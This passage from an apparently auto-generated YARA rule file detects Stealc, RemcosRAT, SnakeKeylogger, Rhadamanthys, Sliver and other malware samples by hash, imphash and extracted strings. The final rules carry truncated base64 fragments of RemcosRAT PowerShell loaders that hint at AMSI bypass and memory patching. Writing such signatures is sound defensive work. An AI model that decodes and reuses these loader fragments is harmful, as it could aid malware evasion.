      $s9 = " to be variable-length encoded, which makes binary search impossible.The `DW_UT_*` value for this unit is not supported yetRange" ascii /* score: '18.00'*/
      $s10 = "ExitStatusfatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s11 = "Invalid PE import descriptor nameInvalid PE import thunk addressMissing PE import thunk hintMissing PE import thunk nameMissing " ascii /* score: '18.00'*/
      $s12 = "assertion failed: n <= self.buf.init - self.buf.filled" fullword ascii /* score: '18.00'*/
      $s13 = "dAddrInUseAddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesyst" ascii /* score: '17.00'*/
      $s14 = "targetAddress()" fullword ascii /* score: '17.00'*/
      $s15 = "er, but found a CIE pointer instead.Invalid branch target in DWARF expressionDW_OP_push_object_address used but no object addres" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Stealc_signature__c7269d59926fa4252270f407e4dab043_imphash__Stealc_signature__c7269d59926fa4252270f407e4dab043_imphash__837_28 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash2 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $x1 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x2 = ".lib section in a.out corruptedbad write barrier buffer boundscannot assign requested addresscasgstatus: bad incoming valueschec" ascii /* score: '46.50'*/
      $x3 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadSetEndOfFileTransmitFileVirtualA" ascii /* score: '44.00'*/
      $x4 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock,  nBSSRoot" ascii /* score: '43.00'*/
      $x5 = "RtlGetNtVersionNumbersaddress already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in r" ascii /* score: '42.00'*/
      $x6 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '42.00'*/
      $x7 = "mismatched count during itab table copymspan.sweep: bad span state after sweepout of memory allocating heap arena mapruntime: ca" ascii /* score: '41.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '38.00'*/
      $x9 = "WSAEnumProtocolsWbad TinySizeClassdebugPtrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0" ascii /* score: '38.00'*/
      $x10 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '37.00'*/
      $x11 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii /* score: '36.00'*/
      $x12 = "bad flushGen bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x13 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllmadvdontneedmheapSpecialmspanSpe" ascii /* score: '32.00'*/
      $s14 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  found at *( gcscandone  heapM" ascii /* score: '30.00'*/
      $s15 = "llocabi mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend " ascii /* score: '29.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a4_i_29 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash5 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $x1 = ":System.Private.TypeLoader.dll$System.Private.Uri" fullword ascii /* score: '31.00'*/
      $s2 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$RelativeOrAbsolute" fullword ascii /* score: '24.00'*/
      $s3 = "The System.Text.Json library is built-in as part of the shared framework in .NET Runtime. The package can be installed when you " ascii /* score: '19.00'*/
      $s4 = "need to use it in other target frameworks." fullword ascii /* score: '17.00'*/
      $s5 = "2GetUriPartsFromUserString<GetLengthWithoutTrailingSpaces" fullword ascii /* score: '17.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<System.Text.RegularExpressions.Symbolic.SymbolicRegexNode<TSet>>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<System.Text.RegularExpressions.Symbolic.SymbolicRegexNode<TSet>>.get_Current" fullword ascii /* score: '15.00'*/
      $s8 = " GetTargetCulture" fullword ascii /* score: '14.00'*/
      $s9 = ",GetHostViaCustomSyntax" fullword ascii /* score: '14.00'*/
      $s10 = "Invalid URI: A Dos path must be rooted, for example, 'c:\\\\'" fullword wide /* score: '13.00'*/
      $s11 = "4InitializeCommandLineArgsW" fullword ascii /* score: '12.00'*/
      $s12 = "4DecrementRunningForeground0WaitForForegroundThreads6GetOSHandleForCurrentThread" fullword ascii /* score: '12.00'*/
      $s13 = " ThreadEntryPoint\"GetApartmentState@" fullword ascii /* score: '12.00'*/
      $s14 = "Invalid URI: The Authority/Host could not be parsed" fullword wide /* score: '12.00'*/
      $s15 = "This operation is not supported for a relative URI" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__SnakeKeylogger_signature__f34_30 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5487558b.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a29e9b8e.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b43a26bb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35e0daa6826570cbb6799a2f585f50e057377998c1c37750636678f70b256122"
      hash2 = "eb93a2c587001ccf2607575c3639b8229d112347d870dfdeec97876f7e0ad8e1"
      hash3 = "5487558b2691eda44b1e4476a8597588f290f6686d200ac9a8e8692d186432a4"
      hash4 = "a29e9b8e67c16a0c46bed63e400297cb520b0084d1a2cccd76fcc4201caae734"
      hash5 = "b43a26bba9392c41659ef71c0ba10b4c00d641646c002a64cbe11d09fc4f5cd9"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD4T" fullword ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD*G" fullword ascii /* score: '27.00'*/
      $s3 = "iamgeB.ErrorImage" fullword wide /* score: '10.00'*/
      $s4 = "iamgeA.ErrorImage" fullword wide /* score: '10.00'*/
      $s5 = "getHeigh" fullword ascii /* score: '9.00'*/
      $s6 = "getWeight" fullword ascii /* score: '9.00'*/
      $s7 = "labelComp2" fullword wide /* score: '8.00'*/
      $s8 = "labelComp5" fullword wide /* score: '8.00'*/
      $s9 = "labelComp1" fullword wide /* score: '8.00'*/
      $s10 = "labelComp4" fullword wide /* score: '8.00'*/
      $s11 = "labelComp3" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_31 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash3 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash4 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash5 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash6 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s2 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s3 = "System.Runtime.CompilerService" fullword wide /* score: '20.00'*/
      $s4 = "2GetRuntimeTypeBypassCache" fullword ascii /* score: '19.00'*/
      $s5 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s6 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s7 = "<TryGetPointerTypeForTargetType0GetPointerTypeTargetTypeLTryGetFunctionPointerTypeForComponents@" fullword ascii /* score: '17.00'*/
      $s8 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '17.00'*/
      $s9 = "DReflectionExecutionDomainCallbacks&TypeLoaderCallbacks6StackTraceMetadataCallbacks$FunctionPointerOps[" fullword ascii /* score: '16.00'*/
      $s10 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '16.00'*/
      $s11 = "ExecutionDomain(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
      $s12 = "[!] Invalid thread handle or payload bas" fullword wide /* score: '16.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<Internal.Reflection.Core.QScopeDefinition>.get_Current@" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<Internal.Metadata.NativeFormat.NamespaceDefinitionHandle>.get_Current@" fullword ascii /* score: '15.00'*/
      $s15 = "[!] Failed to get thread context for PE" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imp_32 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s5 = "icu.dll" fullword wide /* score: '20.00'*/
      $s6 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s7 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s8 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s9 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s10 = "Description: The application requested process termination through System.Environment.FailFast" fullword wide /* score: '17.00'*/
      $s11 = "peForTargetTypeNTryGetByRefTypeForTargetType_LookupOnly(GetCanonicalHashCode@" fullword ascii /* score: '16.00'*/
      $s12 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '16.00'*/
      $s13 = "Concurrent operations from multiple threads on this type are not supported" fullword wide /* score: '15.00'*/
      $s14 = "The collection's comparer does not support the requested operation" fullword wide /* score: '15.00'*/
      $s15 = "GCDTargetTCP" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_33 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "*windows.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "golang.org/x/sys/windows.getSystemDirectory" fullword ascii /* score: '18.00'*/
      $s3 = "golang.org/x/sys/windows.(*DLLError).Unwrap" fullword ascii /* score: '18.00'*/
      $s4 = "golang.org/x/sys/windows.(*DLLError).Error" fullword ascii /* score: '18.00'*/
      $s5 = "golang.org/x/sys/windows.GetSystemDirectory" fullword ascii /* score: '18.00'*/
      $s6 = "*windows.DLLError" fullword ascii /* score: '16.00'*/
      $s7 = "golang.org/x/sys/windows.(*DLL).FindProc" fullword ascii /* score: '15.00'*/
      $s8 = "golang.org/x/sys/windows.(*LazyDLL).Load" fullword ascii /* score: '15.00'*/
      $s9 = "golang.org/x/sys/windows.LoadDLL" fullword ascii /* score: '15.00'*/
      $s10 = "golang.org/x/sys/windows.getStdHandle" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s12 = "golang.org/x/sys/windows.(*LazyDLL).NewProc" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s14 = "golang.org/x/sys/windows.GetStdHandle" fullword ascii /* score: '15.00'*/
      $s15 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__995cce3d6fb20b2d8af502c8788f55d7_i_34 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash3 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "DSystem.Text.RegularExpressions.dll" fullword ascii /* score: '26.00'*/
      $s2 = "<EnsureSufficientExecutionStackBTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '21.00'*/
      $s3 = "HDateTimeOffsetTimeZonePostProcessing" fullword ascii /* score: '20.00'*/
      $s4 = "RehydrateTarget.EnsureComAwareReference" fullword ascii /* score: '20.00'*/
      $s5 = "GetDateOfNNDS*ProcessDateTimeSuffix" fullword ascii /* score: '20.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '18.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '18.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<Internal.TypeSystem.FieldDesc>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "nSystem.Collections.Generic.ICollection<TValue>.ContainsxSystem.Collections.Generic.IEnumerable<TValue>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s10 = "DGetWrongValueTypeArgumentException.GetKeyNotFoundException" fullword ascii /* score: '15.00'*/
      $s11 = "4ProcessHebrewTerminalState" fullword ascii /* score: '15.00'*/
      $s12 = ".GetHashCodeOfStringCore\"IcuInitSortHandle2GetIsAsciiEqualityOrdinal IcuCompareString" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<System.Text.RegularExpressions.Group>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s14 = "(ProcessTerminalState" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IList<System.Text.RegularExpressions.Group>.get_Item" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc7b56a4_RemcosRAT_signature__d50825f4_35 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc7b56a4.bat, RemcosRAT(signature)_d50825f4.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc7b56a4bd2ce38278456412fe5b31cf7b742fd23e807b5109617631592fc9c5"
      hash2 = "d50825f42162126cafad375cfe5995b2a0b632a5238ed9b66d929613e2ec7020"
   strings:
      $s1 = "CgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQAxADQALAAxADAAMQAsADEAMQA1A" ascii /* score: '11.00'*/
      $s2 = "FMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlA" ascii /* score: '11.00'*/
      $s3 = "FAAcgBvAHAAZQByAHQAeQAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAFMAZQBzA" ascii /* score: '11.00'*/
      $s4 = "HMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQB0AHAAdQB0AFQAeQBwAGUAIAA9A" ascii /* score: '11.00'*/
      $s5 = "HYAaQBkAGUAcgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJABiAGEAcwBlA" ascii /* score: '11.00'*/
      $s6 = "D0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB2AHQAYQBiAGwAZQAgACsAIAAxA" ascii /* score: '11.00'*/
      $s7 = "F0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAG0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEQAYQB0AGEALgBMAGUAbgBnAHQAaAAgA" ascii /* score: '11.00'*/
      $s8 = "HMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALgBNAGEAawBlAEIAeQBSA" ascii /* score: '11.00'*/
      $s9 = "CQAZwBsAG8AYgBhAGwAOgByAHUAbgB0AGkAbQBlAEQAYQB0AGEALgBuAGEAdABpAHYAZQBJAG4AdABlAHIAZgBhAGMAZQAgAD0AIAAkAHQAZQB4AHQARABlAGMAbwBkA" ascii /* score: '11.00'*/
      $s10 = "CQAbQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhA" ascii /* score: '11.00'*/
      $s11 = "GkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAGEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpA" ascii /* score: '11.00'*/
      $s12 = "GYAYQBpAGwAZQBkADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvA" ascii /* score: '11.00'*/
      $s13 = "EkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEkAbQBwA" ascii /* score: '11.00'*/
      $s14 = "EYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAdgB0A" ascii /* score: '11.00'*/
      $s15 = "G8AdABlAGMAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIAAkAHAAcgBvAHQAZQBjAHQAaQBvAG4ARABlAGwAZQBnAGEAdABlAC4ASQBuAHYAbwBrAGUAKAAkAHQAcgBhA" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x6725 or uint16(0) == 0x7525 ) and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__b22d450f_RemcosRAT_signature__d96e82d9_36 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_b22d450f.vbs, RemcosRAT(signature)_d96e82d9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b22d450f1a3799f1c1d1ab6a655a8f9987b32d7d15b254fd586fb4aab34a9d65"
      hash2 = "d96e82d980a8872cb39e5ab834e00ea41f4572321f2e5c5a5aab71d3d03f3458"
   strings:
      $s1 = "ABlAG4AdABTAGMAYQBuAEYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AVQB0AGkAbABpAHQAaQBlAHMALgBHAGUAdABNAGUAdABoAG8AZ" ascii /* score: '11.00'*/
      $s2 = "wBhAHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAO" ascii /* score: '11.00'*/
      $s3 = "wBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAGgAYQBuAGQAbABlAFIAZQBmAGUAcgBlAG4AYwBlACwAIAAkAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAKQApAA0AC" ascii /* score: '11.00'*/
      $s4 = "gB5AHQAZQBbAF0AXQBAACgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQAxADQAL" ascii /* score: '11.00'*/
      $s5 = "ABuAGUAeAB0AFAAcgBvAHYAaQBkAGUAcgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAc" ascii /* score: '11.00'*/
      $s6 = "ABzAGUAcwBzAGkAbwBuAFAAcgBvAHAAZQByAHQAeQAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAJ" ascii /* score: '11.00'*/
      $s7 = "ABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAG0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEQAYQB0AGEAL" ascii /* score: '11.00'*/
      $s8 = "gBvAHIAZQBhAGMAaAAgACgAJABjAHUAcgByAGUAbgB0AFAAcgBvAHYAaQBkAGUAcgAgAGkAbgAgACQAYQB2AGEAaQBsAGEAYgBsAGUAUAByAG8AdgBpAGQAZQByAHMAK" ascii /* score: '11.00'*/
      $s9 = "ABkAGUAcgAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZ" ascii /* score: '11.00'*/
      $s10 = "wBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAbABpAGIAcgBhAHIAeQBIAGEAbgBkAGwAZ" ascii /* score: '11.00'*/
